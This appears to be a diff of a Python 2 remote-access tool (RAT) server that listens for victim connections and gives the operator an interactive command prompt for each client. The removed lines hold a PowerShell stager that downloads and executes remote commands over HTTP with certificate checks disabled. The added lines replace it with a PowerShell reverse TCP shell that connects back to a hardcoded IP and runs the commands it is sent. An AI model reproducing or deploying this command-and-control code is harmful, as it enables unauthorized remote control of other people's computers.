@@ -1,6 +1,5 @@
 import socket
 import threading
-import logging
 
 allConnections = []
 allAddresses = []
@@ -32,25 +31,24 @@ def get_command():
                     msg = raw_input("control %s:%s> " % (allAddresses[pk][0], allAddresses[pk][1]))
                     #if msg == "exit":
                     #    break
-                    send_message(msg, allConnections[pk])
+                    allConnections[pk].send(msg)
                     allConnections[pk].settimeout(5)
                     result = allConnections[pk].recv(1024)
-                    result += allConnections[pk].recv(1024)
-                    result += allConnections[pk].recv(1024)
+                    result = result.decode('utf8')
                     print result
 
                 except KeyboardInterrupt:
                     print "Catch C-c"
                     break
                 except Exception, e:
-                    print "error:" + e
-                    continue
+                    print "error:" + str(e)
+                    break
                             
 
                 
 
 def service():
-    sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     port = 1937
     sock.bind(('', port))
     sock.listen(5)
@@ -58,33 +56,49 @@ def service():
         try:
             conn, addr = sock.accept()
             conn.setblocking(1)
-            print "Connected with " + addr[0] + ":" + str(addr[1])
-            print "Totle Client: %d" % clientCount
-            request = conn.recv(23)
+            if conn:
+                request = conn.recv(23)
+            print request
             if request.find("/connect") > 0:
-                send_message(keep_connect("127.0.0.1", str(port)), conn)
-            #elif request.find("/connect") > 0:
-
-            allConnections.append(conn)
-            allAddresses.append(addr)
-        except:
+                send_message(keep_connect("192.168.199.100", port), conn)
+            else:
+                allConnections.append(conn)
+                allAddresses.append(addr)
+                print "Connected with " + addr[0] + ":" + str(addr[1])
+        except Exception, e:
+            print "error:" + str(e)
             break
 
-def keep_connect(ip , port):
-    message = '''        			
-                $s = "http://%s:%s/rat"
-                $w = New-Object Net.WebClient
-                    while($true)
-                    {
-                    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-                    $r = $w.DownloadString($s)
-                    while($r) {
-                            $o = invoke-expression $r | out-string
-                            $w.UploadString($s, $o)
-                            break
-                    }
-                    }
-	      '''%(ip,port)
+def keep_connect(ip, port):
+    message = '$client = New-Object System.Net.Sockets.TcpClient("%s",%d)' % (ip, port)
+    message += '''
+                $stream = $client.GetStream()
+                [byte[]]$bytes = 0..65535|%{0}
+                if ($stream.CanWrite)
+                {
+                            $sendBytes = ([text.encoding]::ASCII).GetBytes("rat")
+                            $stream.Write($sendBytes, 0, $sendBytes.Length)
+                            while (1)
+                            {
+                                 try{
+                                     $data = $stream.read($bytes, 0, $bytes.Length)
+                                     $EncodedText = New-Object -TypeName System.Text.UTF8Encoding
+                                     $info = $EncodedText.GetString($bytes,0, $data)
+                                     $sendback = (Invoke-Expression -Command $info 2>&1 | Out-String )
+                                     $sendbackBytes = ([text.encoding]::UTF8).GetBytes($sendback)
+                                     $stream.Write($sendbackBytes,0,$sendbackBytes.Length)
+                                     write($info)
+                                 }
+                                 catch
+                                 {
+                                     Write-Error $_
+                                     continue
+                                 }
+                            }
+                }
+                else
+                {       }
+	      '''
     return message
 
 def send_message(msg, conn):
